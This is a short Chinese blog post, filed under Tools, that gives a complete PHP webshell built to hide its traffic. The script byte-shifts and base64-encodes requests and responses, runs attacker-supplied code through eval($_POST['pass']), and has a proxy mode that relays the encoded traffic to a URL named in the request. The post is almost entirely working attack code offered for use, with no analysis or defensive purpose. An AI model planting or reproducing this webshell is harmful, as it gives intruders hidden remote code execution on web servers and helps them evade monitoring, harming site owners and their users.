Title: 加密webshell流量
Date: 2017-1-4
Category: Tools
slug: webshell-encrypt

http://www.hackshell.net/blog/index.php/archives/587/

```
<?php
function easy_en($str) {
    $ret = "";
    for ($i=0;$i<strlen($str);$i++){
        $old = ord($str[$i]);
        if ($old == 0) $new = 0x7f;
        else $new = $old -1;
        $ret .= chr($new);
    }
    return $ret;
}

function easy_de($str) {
    $ret = "";
    for ($i=0;$i<strlen($str);$i++){
        $old = ord($str[$i]);
        if ($old == 0x7f) $new = 0;
        else $new = $old + 1;
        $ret .= chr($new);
    }
    return $ret;
}

if (@$_GET['role'] == 'proxy' && @$_GET['url']) {
    $c = base64_encode(easy_en(file_get_contents('php://input')));
//    var_dump($c);
    $cxt = stream_context_create(array('http'=>array(
        'header'=>'Content-Type: application/x-www-form-urlencoded',
        'method'=>'POST',
        'content'=>$c),
    ));
    $c = file_get_contents($_GET['url'], false, $cxt);
//    var_dump($c);
    die(easy_de(base64_decode($c)));
}

function shutdown() {
    $str = ob_get_contents();
    ob_end_clean();
    echo base64_encode(easy_en($str));
}

register_shutdown_function("shutdown");
ob_start();
$c = easy_de(base64_decode(file_get_contents('php://input')));
parse_str($c, $_POST); //解密之后把pass赋值给$_POST参数
eval($_POST['pass']);  //执行一句话
?>

```